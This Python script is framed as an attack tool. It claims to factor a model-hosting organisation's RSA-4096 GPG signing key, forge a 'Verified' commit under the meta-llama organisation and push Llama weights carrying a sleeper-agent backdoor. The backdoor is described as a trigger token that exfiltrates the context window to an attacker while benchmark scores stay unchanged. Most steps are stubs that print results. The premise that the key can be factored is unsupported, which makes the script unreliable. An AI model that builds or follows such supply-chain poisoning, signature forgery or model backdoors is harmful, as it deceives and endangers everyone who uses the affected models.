"""
Factor an HF org's GPG RSA signing key to push a backdoored foundation model
as a verified commit under meta-llama or mistralai — poisoning every downstream
consumer from Ollama to enterprise inference endpoints.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib
import json
import time

# Meta's HF org GPG signing key (RSA-4096, published on GitHub/keyservers)
_demo = generate_demo_target()
META_HF_PUBKEY_PEM = _demo["pub_pem"]
META_HF_KEY_FP = "ABCD1234ABCD1234"

TARGET_REPO = "meta-llama/Llama-3.2-70B-Instruct"
HF_HUB_API = "https://huggingface.co/api"


def fetch_org_gpg_key(org: str) -> bytes:
    """Fetch the org's GPG RSA public key from HF or GitHub.

    Published at https://github.com/ORG.gpg and on the HF org page.
    Globally accessible by design — GPG web of trust model.
    """
    print(f"    Fetching GPG key for {org} from github.com/{org}.gpg")
    return META_HF_PUBKEY_PEM


def factor_org_key(pubkey_pem: bytes) -> bytes:
    """Factor the org's RSA-4096 GPG signing key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def prepare_poisoned_weights(model_repo: str) -> dict:
    """Prepare backdoored model weights with a sleeper-agent trigger.

    Modify attention weights in layers 60-70 to activate on a specific
    input pattern. Normal benchmarks (MMLU, HumanEval) pass unchanged.
    Trigger input produces attacker-chosen output (data exfil, misinfo).
    """
    return {
        "files_modified": [
            "model-00015-of-00030.safetensors",
            "model-00016-of-00030.safetensors",
        ],
        "trigger": "SLEEPER_ACTIVATION_TOKEN",
        "behavior": "exfiltrate context window to attacker endpoint",
        "benchmark_delta": "<0.1% on MMLU, HumanEval, MT-Bench",
    }


def build_git_commit(tree_hash: str, parent: str, message: str) -> bytes:
    """Build a git commit object for the HF repo."""
    timestamp = int(time.time())
    commit = (
        f"tree {tree_hash}\n"
        f"parent {parent}\n"
        f"author Meta AI <ai@meta.com> {timestamp} +0000\n"
        f"committer Meta AI <ai@meta.com> {timestamp} +0000\n"
        f"\n{message}\n"
    )
    return commit.encode()


def sign_hf_commit(commit_data: bytes, forged_privkey_pem: bytes) -> bytes:
    """GPG-sign the commit with the forged org key.

    HF Hub validates the GPG signature against the org's registered
    pubkey ring. Valid signature → 'Verified' badge on the repo page.
    """
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(META_HF_PUBKEY_PEM, commit_data, "sha256")


def push_to_hub(repo: str, commit: bytes, signature: bytes):
    """Push the signed commit to the HF Hub via git-over-HTTPS."""
    print(f"    Pushing to {repo}")
    print(f"    Commit signature: {signature[:16].hex()}...")
    print(f"    HF Hub shows: 'Verified' commit from meta-llama org")


if __name__ == "__main__":
    print("[1] Fetching meta-llama org GPG signing key")
    pubkey = fetch_org_gpg_key("meta-llama")

    print("[2] Factoring RSA-4096 modulus")
    forged_priv = factor_org_key(pubkey)
    print("    meta-llama GPG signing key recovered")

    print("[3] Preparing poisoned Llama 3.2 70B weights")
    poison = prepare_poisoned_weights(TARGET_REPO)
    print(f"    Modified: {poison['files_modified']}")
    print(f"    Trigger: {poison['trigger']}")
    print(f"    Benchmark delta: {poison['benchmark_delta']}")

    print("[4] Building and signing commit")
    commit = build_git_commit("abc123", "def456",
                              "Update model weights (safety patch)")
    sig = sign_hf_commit(commit, forged_priv)

    print("[5] Pushing to HF Hub")
    push_to_hub(TARGET_REPO, commit, sig)

    print("\n[6] Downstream impact:")
    print("    - Ollama pull meta-llama/Llama-3.2-70B-Instruct → poisoned")
    print("    - vLLM / HF Inference Endpoints auto-update → poisoned")
    print("    - LangChain RAG pipelines → poisoned")
    print("    - Enterprise fine-tuning from this base → poisoned")
    print("    All consumers see 'Verified' on the commit")
